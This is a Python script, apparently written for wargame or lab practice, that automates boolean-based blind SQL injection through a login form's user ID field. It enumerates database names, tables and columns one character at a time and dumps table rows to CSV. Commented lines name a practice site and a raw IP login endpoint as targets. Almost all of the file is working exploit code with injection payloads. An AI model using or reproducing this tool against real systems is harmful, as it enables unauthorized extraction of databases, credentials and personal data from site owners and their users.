import sys
import requests
import pandas
from tkinter import messagebox
import codecs

#url = 'https://webhacking.kr/challenge/bonus-1/index.php'
#url = 'http://104.197.42.200/member/login_ok.php'
#cookies = {'PHPSESSID': 'd42rp6qqm5fhj3dmn3830g74pq'}
keyword = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

check = '로그인 성공'.encode()

def count_db(url, cookies):
	result = 0
	while 1:
		value = "' or (select count(distinct table_schema) from information_schema.tables) = {}#".format(result)
		params = {'userid': value, 'userpw': 'test'}
		response = requests.post(url,data=params, cookies=cookies)
		#print(response.content)
		print(value)
		if check in response.text.encode('utf-8'):
			break
		else:
			result += 1
	return result

def count_data(url, cookies, table_name):
	result = 0
	while 1:
		value = "' or 1=1 and (SELECT count(*) from {}) = {}#".format(table_name, result)
		params = {'userid': value, 'userpw': 'test'}
		response = requests.post(url,data=params, cookies=cookies)
		#print(response.content)
		print(value)
		if check in response.text.encode('utf-8'):
			break
		else:
			result += 1
	return result

def find_db_name(values, url, cookies):
    result = ''
    size = count_db(url, cookies)
    for loop in range(size):
        i = 1
        flag = True
        while flag:
            for key in keyword:
                value = "'or binary(substring((select distinct table_schema from information_schema.tables limit {},1),{},1)) = '{}'#".format(loop, i, key)
                params = {'userid': value, 'userpw': 'test'}
                response = requests.post(url,data=params, cookies=cookies)
                #print(response.content)
                print(value)
                if check in response.text.encode('utf-8'):
                    result += key
                    i += 1
                    break
                if key == '0':
                    values.append(result)
                    flag = False
                    result = ''
    print(values)
    messagebox.showinfo("성공", "db name 추출 완료")
    return values

def find_table_name(tableList, url, cookies, db_name):
    result = ''
    size = 0
    i = 1
    flag = True
    while flag:
        for key in keyword:
            value = "' or 1=1 and substring((select table_name from information_schema.tables where table_type='base table' and table_schema='{}' limit {},1),{},1)='{}'#".format(db_name, size, i, key)
            params = {'userid': value, 'userpw': 'test'}
            response = requests.post(url,data=params, cookies=cookies)
            #print(response.content)
            print(value)
            if check in response.text.encode('utf-8'):
                result += key
                i += 1
                break
            if key == '0':
                if i  == 1:
                    flag = False
                    break
                tableList.append(result)
                result = ''
                i = 1
                size += 1
    print(tableList)
    messagebox.showinfo("성공", "table 추출 완료")
    return tableList

def find_column_name(columnList, url, cookies, table_name):
    result = ''
    size = 0
    i = 1
    flag = True
    while flag:
        for key in keyword:
            value = "' or 1=1 and substring((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1)='{}'#".format(table_name, size, i, key)
            params = {'userid': value, 'userpw': 'test'}
            response = requests.post(url,data=params, cookies=cookies)
	 		#print(response.content)
            print(value)
            if check in response.text.encode('utf-8'):
                result += key
                i += 1
                break
            if key == '0':
                if i  == 1:
                    flag = False
                    break
                columnList.append(result)
                result = ''
                i = 1
                size += 1
    print(columnList)
    messagebox.showinfo("성공", "column 추출 완료")
    return columnList

def dump_data(url, cookies, table_name, column_list):
    result = ''
    size = 0
    count = count_data(url, cookies, table_name)
    dict = {}
    
    for column_name in column_list:
        list = []
        for size in range(count):
            i = 1
            flag = True
            while flag:
                for key in keyword:
                    value = "' or 1=1 and substring(hex(concat((select {} from {} limit {},1))),{},1)='{}'#".format(column_name, table_name, size, i, key)
                    params = {'userid': value, 'userpw': 'test'}
                    response = requests.post(url,data=params, cookies=cookies)
                    print(value)
                    if check in response.text.encode('utf-8'):
                        result += key
                        print(result)
                        i += 1
                        break
                    if i == 1 and key == '0':
                        list.append('NULL')
                        flag = False
                        break
                    if key == '0':
                        var = bytes.fromhex(result).decode('utf-8')
                        print(var)
                        list.append(var)
                        result = ''
                        i = 1
                        flag = False
        dict[column_name] = list
        print(list)
    print(dict)
    dataFrame = pandas.DataFrame(dict)
    dataFrame.to_csv('{}.csv'.format(table_name))
    messagebox.showinfo("성공", "data dump 완료")
    return dict
